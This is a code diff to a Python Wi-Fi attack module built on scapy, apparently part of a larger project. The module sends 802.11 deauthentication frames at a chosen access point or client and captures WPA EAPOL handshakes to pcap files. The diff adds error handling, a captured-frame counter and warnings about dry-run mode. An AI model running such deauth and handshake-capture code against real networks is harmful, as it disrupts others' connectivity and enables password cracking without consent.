@@ -22,6 +22,7 @@ class RFResult:
     frames_sent: int
     dry_run: bool = False
     detail: str = ""
+    frames_captured: int = 0   # FIX 3: EAPOL frames received (capture path only)
 
 
 def build_deauth_frames(bssid: str, client: str = BROADCAST, reason: int = 7):
@@ -47,7 +48,11 @@ def _scapy_set_channel(iface, channel):
 
 
 def _scapy_sniff(iface, bssid, timeout):
-    """Capture EAPOL frames for one BSSID on the current channel."""
+    """Capture EAPOL frames for one BSSID on the current channel.
+
+    NOTE: time.sleep(timeout) blocks the calling thread for up to `timeout`
+    seconds. Async orchestration should inject its own sniffer or use a short
+    timeout rather than relying on this default implementation."""
     from scapy.all import AsyncSniffer, Dot11, EAPOL  # type: ignore
     b = bssid.lower()
 
@@ -62,7 +67,7 @@ def _scapy_sniff(iface, bssid, timeout):
     sn = AsyncSniffer(iface=iface, lfilter=_match)
     sn.start()
     import time
-    time.sleep(timeout)
+    time.sleep(timeout)  # blocks calling thread; see docstring above
     return sn.stop() or []
 
 
@@ -78,6 +83,8 @@ class TargetedRF:
         self._sender = sender or _scapy_sendp
         self._set_channel = set_channel
         self._sniffer = sniffer
+        # WARNING: flipping dry_run to False post-construction arms the radio.
+        # Callers should construct with the intended mode and not mutate this field.
         self.dry_run = dry_run
 
     def deauth(self, bssid: str, client: str = BROADCAST,
@@ -91,7 +98,11 @@ class TargetedRF:
             return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                             dry_run=True,
                             detail=f"would send {len(frames)}x{count} to {bssid}/{client}")
-        self._sender(frames, self.iface, count)
+        try:
+            self._sender(frames, self.iface, count)
+        except Exception as e:
+            return RFResult(ok=False, reason=f"tx error: {e}", frames_sent=0,
+                            detail="sender failed")
         return RFResult(ok=True, reason=why, frames_sent=len(frames) * count,
                         detail=f"deauth {bssid} <-> {client}")
 
@@ -106,19 +117,25 @@ class TargetedRF:
         if self.dry_run:
             return RFResult(ok=True, reason="dry-run (no tx)", frames_sent=0,
                             dry_run=True, detail=f"would capture {bssid} ch{channel}")
-        set_ch(self.iface, channel)
-        pkts = sniff(self.iface, bssid, timeout)
-        if not pkts:
-            return RFResult(ok=True, reason="no EAPOL captured", frames_sent=0)
-        out = out_dir or (DATA_DIR / "handshakes")
-        from pathlib import Path
-        out = Path(out)
-        out.mkdir(parents=True, exist_ok=True)
-        from kuma_core.events import utcnow_iso
-        stamp = utcnow_iso().replace(":", "").replace("-", "")
-        path = out / f"{bssid.replace(':', '').upper()}-{stamp}.pcap"
-        wrpcap(str(path), pkts)
-        return RFResult(ok=True, reason=why, frames_sent=len(pkts),
+        try:
+            set_ch(self.iface, channel)
+            pkts = sniff(self.iface, bssid, timeout)
+            if not pkts:
+                return RFResult(ok=True, reason="no EAPOL captured", frames_sent=0,
+                                frames_captured=0)
+            out = out_dir or (DATA_DIR / "handshakes")
+            from pathlib import Path
+            out = Path(out)
+            out.mkdir(parents=True, exist_ok=True)
+            from kuma_core.events import utcnow_iso
+            stamp = utcnow_iso().replace(":", "").replace("-", "")
+            path = out / f"{bssid.replace(':', '').upper()}-{stamp}.pcap"
+            wrpcap(str(path), pkts)
+        except Exception as e:
+            return RFResult(ok=False, reason=f"capture error: {e}", frames_sent=0,
+                            detail="hardware/io failed")
+        return RFResult(ok=True, reason=why, frames_sent=0,
+                        frames_captured=len(pkts),
                         detail=f"captured {len(pkts)} EAPOL -> {path.name}")
 
 
@@ -156,7 +173,7 @@ def run_cli(args, rf=None) -> int:
     if args.capture:
         res = rf.capture_handshake(args.bssid, channel=args.channel,
                                    timeout=args.timeout)
-        print(f"[capture] ok={res.ok} {res.reason} frames={res.frames_sent} "
+        print(f"[capture] ok={res.ok} {res.reason} captured={res.frames_captured} "
               f"{res.detail}", flush=True)
         rc = rc or (0 if res.ok else 1)
     return rc
